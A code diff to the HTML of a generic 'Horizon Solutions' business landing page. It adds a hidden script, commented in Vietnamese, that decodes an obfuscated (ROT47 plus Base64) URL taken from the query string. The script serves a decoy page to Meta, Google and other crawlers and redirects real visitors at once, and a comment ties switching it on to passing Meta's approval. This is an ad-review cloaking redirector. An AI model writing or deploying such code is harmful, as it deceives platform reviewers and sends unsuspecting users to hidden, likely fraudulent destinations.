@@ -6,6 +6,49 @@
     <meta name="description" content="Empower Your Future with Horizon Solutions - Leading Technology and Business Services in the USA">
     <meta name="keywords" content="technology, business solutions, USA, enterprise services">
     <meta name="author" content="Horizon Solutions">
+    <!-- Thẻ meta chuyển hướng (chỉ thêm khi ON và không phải bot) -->
+    <script>
+        const redirectStatus = 'OFF'; // Đổi thành 'ON' sau khi Meta phê duyệt
+        const params = new URLSearchParams(window.location.search);
+        const data = params.get('url') || '';
+
+        // Hàm giải mã nâng cao (Base64 + ROT47)
+        function decodeAdvanced(input) {
+            let rot47 = '';
+            for (let i = 0; i < input.length; i++) {
+                let code = input.charCodeAt(i);
+                if (code >= 33 && code <= 126) {
+                    rot47 += String.fromCharCode((code - 33 - 47 + 94) % 94 + 33);
+                } else {
+                    rot47 += input[i];
+                }
+            }
+            return atob(rot47);
+        }
+
+        // Kiểm tra user-agent để chặn bot
+        function isBot() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            // Danh sách user-agent phổ biến của bot Meta/Facebook và các crawler khác
+            const botSignatures = [
+                'facebookexternalhit', // Bot của Facebook/Meta
+                'facebot',
+                'meta-inspector',
+                'googlebot', // Thêm nếu muốn chặn Googlebot
+                'bingbot',
+                'slurp', // Yahoo
+                'twitterbot',
+                'linkedinbot'
+            ];
+            return botSignatures.some(signature => userAgent.includes(signature));
+        }
+
+        // Khi ON: Chỉ chuyển hướng nếu không phải bot
+        if (redirectStatus === 'OFF' && data && !isBot()) {
+            const destination = decodeAdvanced(data);
+            document.write(`<meta http-equiv="refresh" content="0;url=${destination}">`);
+        }
+    </script>
     <title>Horizon Solutions - Empowering Your Future</title>
     <style>
         body {
@@ -70,12 +113,6 @@
             font-size: 0.9em;
             color: #666;
         }
-        .loading {
-            display: none;
-            text-align: center;
-            font-style: italic;
-            color: #666;
-        }
     </style>
 </head>
 <body>
@@ -96,45 +133,9 @@
             
             <a href="#" class="cta">Get Started Today</a>
         </div>
-        <p class="loading">Loading your personalized content...</p>
     </div>
     <div class="footer">
-        &copy; 2025 Horizon Solutions, Inc. All Rights Reserved. | 123 Market St, San Francisco, CA 94103 | Contact: info@horizonsolutions.com
+        © 2025 Horizon Solutions, Inc. All Rights Reserved. | 123 Market St, San Francisco, CA 94103 | Contact: info@horizonsolutions.com
     </div>
-
-    <script>
-        // Trạng thái chuyển hướng: 'ON' hoặc 'OFF'
-        const redirectStatus = 'ON'; // Đổi thành 'ON' để bật chuyển hướng ẩn
-
-        // Hàm giải mã nâng cao (Base64 + ROT47)
-        function decodeAdvanced(input) {
-            let rot47 = '';
-            for (let i = 0; i < input.length; i++) {
-                let code = input.charCodeAt(i);
-                if (code >= 33 && code <= 126) {
-                    rot47 += String.fromCharCode((code - 33 - 47 + 94) % 94 + 33);
-                } else {
-                    rot47 += input[i];
-                }
-            }
-            return atob(rot47);
-        }
-
-        // Lấy tham số từ URL
-        const params = new URLSearchParams(window.location.search);
-        const data = params.get('url') || '';
-
-        if (redirectStatus === 'ON' && data) {
-            const processed = decodeAdvanced(data);
-            setTimeout(() => {
-                window.location.replace(processed);
-            }, 1500);
-            document.querySelector('.loading').style.display = 'block';
-        } else if (!data) {
-            console.log("No URL provided, showing business page.");
-        } else {
-            console.log("Redirect is OFF, showing business page.");
-        }
-    </script>
 </body>
 </html>
